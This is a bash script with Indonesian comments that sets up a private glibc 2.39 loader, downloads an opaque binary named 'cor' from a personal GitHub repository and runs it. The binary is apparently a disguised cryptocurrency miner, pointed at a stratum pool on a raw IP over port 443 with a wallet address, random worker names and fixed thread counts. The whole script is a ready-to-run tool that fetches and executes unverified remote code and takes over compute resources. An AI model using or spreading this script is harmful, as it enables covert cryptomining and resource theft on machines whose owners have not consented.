#!/bin/bash
# ============================================
# SCRIPT ALL-IN-ONE: GLIBC 2.39 + COR + WRAPPER + AUTO RUN
# ============================================

set -e

echo "============================================"
echo "🚀 SCRIPT ALL-IN-ONE GLIBC 2.39 + COR"
echo "============================================"

# ============================================
# 1. INSTALL GLIBC 2.39
# ============================================
echo ""
echo "[1/4] Install GLIBC 2.39..."
echo "----------------------------------------"

cd ~
mkdir -p ~/.local/glibc-2.39/lib

# Download dari Ubuntu 24.04
echo "Download libc6 2.39..."
wget -q --show-progress http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.39-0ubuntu8_amd64.deb

echo "Download libc-bin 2.39..."
wget -q --show-progress http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc-bin_2.39-0ubuntu8_amd64.deb

# Ekstrak
echo "Ekstrak packages..."
for deb in *.deb; do
    mkdir -p "extract_${deb%.deb}"
    cd "extract_${deb%.deb}"
    ar x "../$deb"
    tar -xf data.tar.zst 2>/dev/null || tar -xf data.tar.xz 2>/dev/null
    cd ..
done

# Copy library
echo "Copy library GLIBC 2.39..."
find extract_* -name "*.so*" -exec cp -f {} ~/.local/glibc-2.39/lib/ \; 2>/dev/null

# Buat wrapper GLIBC
cat > ~/run-glibc-2.39 << 'EOF'
#!/bin/bash
export LD_LIBRARY_PATH="$HOME/.local/glibc-2.39/lib:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu"
exec "$HOME/.local/glibc-2.39/lib/ld-linux-x86-64.so.2" "$@"
EOF
chmod +x ~/run-glibc-2.39

# Bersih-bersih
rm -rf extract_* *.deb

echo "✅ GLIBC 2.39 berhasil diinstall!"

# ============================================
# 2. DOWNLOAD COR
# ============================================
echo ""
echo "[2/4] Download COR..."
echo "----------------------------------------"

cd ~
if [ -f "./cor" ]; then
    echo "⚠️ File cor sudah ada, skip download"
else
    echo "Download cor dari GitHub..."
    wget -q --show-progress https://github.com/usapindong/test/raw/refs/heads/main/cor
    chmod +x cor
    echo "✅ Cor berhasil didownload!"
fi

# ============================================
# 3. BUAT WRAPPER COR
# ============================================
echo ""
echo "[3/4] Buat wrapper COR..."
echo "----------------------------------------"

cat > ~/run-cor << 'EOF'
#!/bin/bash
# Wrapper untuk menjalankan cor dengan GLIBC 2.39
export LC_ALL=C
export LANG=C
export LD_LIBRARY_PATH="$HOME/.local/glibc-2.39/lib:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu"

# Cek apakah file cor ada
if [ ! -f "./cor" ] && [ ! -f "$HOME/cor" ]; then
    echo "❌ File cor tidak ditemukan!"
    echo "📌 Download dulu: wget https://github.com/usapindong/test/raw/refs/heads/main/cor && chmod +x cor"
    exit 1
fi

# Cari lokasi cor
COR_FILE=""
if [ -f "./cor" ]; then
    COR_FILE="./cor"
elif [ -f "$HOME/cor" ]; then
    COR_FILE="$HOME/cor"
fi

exec "$HOME/.local/glibc-2.39/lib/ld-linux-x86-64.so.2" \
    --library-path "$HOME/.local/glibc-2.39/lib:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu" \
    "$COR_FILE" "$@"
EOF

chmod +x ~/run-cor
echo "✅ Wrapper cor berhasil dibuat!"

# ============================================
# 4. JALANKAN COR
# ============================================
echo ""
echo "[4/4] Menjalankan COR..."
echo "============================================"

# Parameter default
POOL="stratum1+tcp://cb0318b68b6a39f8072ed597385c2e547bc18a817e63.$(shuf -n 1 -i 1-9999)-redmi@103.196.155.151:443"
THREADS="4"

echo "Pool: $POOL"
echo "Threads: $THREADS"
echo "============================================"
echo ""

# Jalankan cor dengan GLIBC 2.39
~/run-cor --noeval --hard-aes -P "$POOL" -t "$THREADS"

# ============================================
# SELESAI
# ============================================
echo ""
echo "============================================"
echo "✅ COR BERJALAN!"
echo "============================================"
echo ""
echo "📌 Untuk menghentikan: Ctrl+C"
echo "📌 Jalankan lagi: ~/run-cor --noeval --hard-aes -P $POOL -t $THREADS"
echo "============================================"
